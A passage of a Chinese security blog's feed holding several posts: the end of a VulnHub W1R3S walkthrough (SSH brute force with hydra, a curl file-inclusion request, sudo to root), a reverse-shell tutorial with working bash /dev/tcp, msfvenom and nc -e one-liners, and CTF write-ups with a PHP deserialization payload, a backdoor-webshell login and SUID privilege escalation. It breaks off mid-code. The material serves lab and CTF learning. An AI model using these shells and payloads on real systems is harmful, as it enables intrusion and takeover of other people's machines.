shadow.txt</span><br><span class="line"><span class="comment"># w1r3s : computer</span></span><br><span class="line"><span class="comment"># www-data : www-data</span></span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>肯定是w1r3s账户的权限更高. ssh连接w1r3s, 成功登录</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.13.0-36-generic 内核比较难提权</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息 Ubuntu 16.04.3 LTS</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 有所有地方的sudo权限</span></span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250129145317.png" alt="image.png"></p><p>不知道为什么执行sudo会卡非常久, 下面的提权也一样</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>存在所有地方的sudo权限, 那就已经结束了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><p>在<code>/root</code>目录下有<code>flag.txt</code>文件</p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>视频解析一定要看, 虽然长度为一个小时: <a href="https://www.bilibili.com/video/BV1mB4y1j7K6">「红队笔记」靶机精讲：W1R3S 1.0.1 - 渗透测试思路为王，细节多到即使对于纯萌新也能无感入圈</a></p><h3 id="22-ssh"><a class="header-anchor" href="#22-ssh">¶</a>22/ssh</h3><p>尝试直接爆破. 从<code>/etc/passwd</code>获取用户名之后, 构造字典或结合已有字典进行爆破</p><blockquote><p>也可以利用从ftp中获取的用户/网站名构造用户名字典. 思路为: 大小写, 可能有权限的用户, 一些可能的字符串等等</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.110.135</span><br></pre></td></tr></table></figure><p>跑肯定是成功的, 毕竟已经解出来过了</p><h3 id="关于搜索到的漏洞"><a class="header-anchor" href="#关于搜索到的漏洞">¶</a>关于搜索到的漏洞</h3><p><code>CVE-2022-37190</code>: 经过身份验证的用户可以从<code>/api/index.php</code>控制两个参数, 可惜我们没有登录</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/22">详细描述 </a></p><p><code>CVE-2022-24266</code>: 在<code>/administrator/components/table_manager/</code>中通过<code>order_by</code>参数发现一个 SQL时间盲注漏洞, 没试出来</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/17">详细描述</a></p><p><code>CVE-2022-25486</code>: 这个才是我们刚才用于本地文件包含的漏洞, 和发现的那个txt不同的点就是一个是GET一个是POST</p><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/25">详细描述</a></p><p>除了这个还想还有一个地方可以进行文件包含<code>/alerts/alertLightbox.php</code>, 经过测试同样是成功包含到<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl --data-urlencode <span class="string">&#x27;url=../../../../../../../../../../../etc/passwd&#x27;</span> http://192.168.110.135/administrator/alerts/alertLightbox.php</span><br></pre></td></tr></table></figure><p><a href="https://github.com/CuppaCMS/CuppaCMS/issues/24">详细描述</a></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> FTP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/article/reverse-shell/"/>
      <url>/article/reverse-shell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>前置知识</h1><h2 id="正反向shell"><a class="header-anchor" href="#正反向shell">¶</a>正反向shell</h2><ul><li>正向shell: 控制端主动发起连接请求去连接被控制端,  中间网络链路不存在阻碍</li><li>反向shell(反弹shell): 被控端主动发起连接请求去连接控制端,  通常被控端由于防火墙限制、 权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包</li></ul><h2 id="Linux标准文件描述符"><a class="header-anchor" href="#Linux标准文件描述符">¶</a>Linux标准文件描述符:</h2><p>Linux系统将所有设备都当作文件来处理, 而Linux用文件描述符来标识每个文件对象; 当Linux启 动的时候会默认打开三个文件描述符</p><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th><th>默认设备</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td><td>默认设备键盘</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td><td>默认设备显示器</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td><td>默认设备显示器</td></tr></tbody></table><h3 id="更改标准输出-输入的位置"><a class="header-anchor" href="#更改标准输出-输入的位置">¶</a>更改标准输出/输入的位置</h3><p>把标准输出位置更改到test文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>把当前标准输出重定向到test文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `flag` 1&gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>把test文件中的内容重定向到标准输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> user 0&lt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span></span><br></pre></td></tr></table></figure><blockquote><p>标准错误输出和标准输出的区别是，它在命令出错情况下的输出</p></blockquote><p>分配自己的文件描述符: 把文件描述符5指向test文件, 然后把当前输出重定向到文件描述符5(用&amp;引用文件描述符, 即找到文件(描述符指向的目标文件)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&gt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;are you ok?&#x27;</span> 1&gt;&amp;5</span><br><span class="line"><span class="built_in">cat</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="dev-null"><a class="header-anchor" href="#dev-null">¶</a>/dev/null</h3><p>特殊文件，写入的任何东西都会被清空。</p><ol><li>把标准错误输出重定向到/dev/null，从而丢掉不想保存的错误信息</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ol start="2"><li>快速移除文件中的数据而不用删除文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="重定向"><a class="header-anchor" href="#重定向">¶</a>重定向</h2><p>重定向是把输出定向到文件或者标准流; 重定向输入输出本质上就是重定向文件描述符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; 从文件读取输入</span><br><span class="line">&gt; 将输出保存到文件</span><br><span class="line">&gt;&gt; 将输出追加到文件</span><br><span class="line">| 将一个程序的输出作为输入发送到另一个程序(管道符)</span><br></pre></td></tr></table></figure><h1>反弹shell本质</h1><p>被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导 致被控端不能正常接收发送过来的数据包</p><h1>反弹shell方法</h1><h2 id="Bash"><a class="header-anchor" href="#Bash">¶</a>Bash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 被控端：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line"><span class="comment"># 控制端：</span></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个交互式的bash shell</span></span><br><span class="line">bash -i</span><br><span class="line"><span class="comment"># /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发起了一个socket调用,建立一个socket连接,读写这个文件就相当于在这个socket连接中传输数据</span></span><br><span class="line"><span class="comment"># 和10.10.1.11的6666端口建立TCP连接</span></span><br><span class="line">/dev/tcp/10.10.1.11/6666</span><br><span class="line"><span class="comment"># 混合输出（正确、错误的输出都输出到一个地方)</span></span><br><span class="line">&gt;&amp;、&amp;&gt;</span><br></pre></td></tr></table></figure><h1>一些反弹shell</h1><p><a href="https://www.revshells.com/">自动生成反弹shell网站</a></p><h2 id="利用msf生成"><a class="header-anchor" href="#利用msf生成">¶</a>利用msf生成:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=172.16.8.131  lport=1234</span><br></pre></td></tr></table></figure><p>生成例子:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;0&lt;&amp;84-;exec 84&lt;&gt;/dev/tcp/172.16.8.131/1234;sh &lt;&amp;84 &gt;&amp;84 2&gt;&amp;84&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="直接写"><a class="header-anchor" href="#直接写">¶</a>直接写:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/172.16.8.131/1234 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.110.130/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="利用nc反弹shell"><a class="header-anchor" href="#利用nc反弹shell">¶</a>利用nc反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.110.130 7777</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unknowCTF</title>
      <link href="/article/unknowCTF/"/>
      <url>/article/unknowCTF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>web</h1><h2 id="ezpop"><a class="header-anchor" href="#ezpop">¶</a>ezpop</h2><p>反序列化、浅拷贝</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DayDay</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker !!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">five</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hahah</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hahah-&gt;<span class="variable">$arg</span>=<span class="string">&quot;Nero&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hahah-&gt;<span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;NoNO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)  </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hahah=<span class="variable">$obj</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FFFF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$four</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;four-&gt;<span class="title function_ invoke__">sihasia</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Tech</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$info</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$Alkaline</span>=<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Alkaline</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hello=<span class="string">&quot;Six G0d&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_SayGo</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you like&quot;</span>.<span class="variable language_">$this</span>-&gt;hello.<span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_SayGo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=<span class="string">&#x27;/flag/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$poc</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$poc</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A5%3A%22Hello%22%3A1%3A%7Bs%3A5%3A%22hello%22%3BO%3A4%3A%22five%22%3A1%3A%7Bs%3A5%3A%22hahah%22%3BO%3A5%3A%22Music%22%3A2%3A%7Bs%3A4%3A%22Tech%22%3BN%3Bs%3A1%3A%22a%22%3BO%3A4%3A%22FFFF%22%3A1%3A%7Bs%3A4%3A%22four%22%3BO%3A6%3A%22DayDay%22%3A3%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A7%3Bs%3A8%3A%22filename%22%3Bs%3A5%3A%22%2Fflflagag%22%3B%7D%7D%7D%7D%7D</span><br><span class="line"></span><br><span class="line">O:5:&quot;Hello&quot;:1:&#123;s:5:&quot;hello&quot;;O:4:&quot;five&quot;:1:&#123;s:5:&quot;hahah&quot;;O:5:&quot;Music&quot;:2:&#123;s:4:&quot;Tech&quot;;N;s:1:&quot;a&quot;;O:4:&quot;FFFF&quot;:1:&#123;s:4:&quot;four&quot;;O:6:&quot;DayDay&quot;:3:&#123;s:6:&quot;secret&quot;;N;s:8:&quot;password&quot;;R:7;s:8:&quot;filename&quot;;s:5:&quot;/flflagag&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="mysecret"><a class="header-anchor" href="#mysecret">¶</a>mysecret</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span>&#123;</span><br><span class="line">    <span class="comment">// Something secret in /hint</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname = <span class="variable">$dbname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">link</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">link</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;host, </span><br><span class="line">            <span class="variable">$this</span>-&gt;username, </span><br><span class="line">            <span class="variable">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">select_db</span>(<span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SET NAMES utf8&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Fail&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Backdoor</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]) === <span class="string">&quot;2e59e260ed970274a5b077635a81c88c3ce9356c&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;backdoor&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>公网ip服务器上运行那个py, 反序列化那里就正常填ip, root, 密码和数据库名为空; 把py文件里面的/etc/passwd改成/hint就行</p><p>反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span>&#123;</span><br><span class="line">    <span class="comment">// Something secret in /hint</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname = <span class="variable">$dbname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">link</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">link</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;host, </span><br><span class="line">            <span class="variable">$this</span>-&gt;username, </span><br><span class="line">            <span class="variable">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">select_db</span>(<span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SET NAMES utf8&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Fail&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DB</span>(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>hint里面是密码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rs297ns9s2930003nn29ss55789ss0sn</span><br></pre></td></tr></table></figure><p>蚁剑连接:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># URL地址:</span><br><span class="line">http://e1c3e1fc72887e91.node.nsctf.cn/?pass=rs297ns9s2930003nn29ss55789ss0sn</span><br><span class="line"># 密码:</span><br><span class="line">backdoor</span><br></pre></td></tr></table></figure><p>cp有SUID权限, 将<code>/etc/passwd</code>复制下来, 在最后添加新的用户</p><p>msf生成php反弹木马, 弹出来即可连接, 然后su切换新的用户, 即可读取flag</p><h2 id="Memory"><a class="header-anchor" href="#Memory">¶</a>Memory</h2><p>python flask 内存马</p><p>给的<code>waf.py</code>文件:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">blacklist=[</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;cookie&#x27;</span>, <span class="string">&#x27;values&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;\\x&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;count&#x27;</span>,<span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;modules&quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    evilcode= random.sample(blacklist,<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> evilcode:</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span 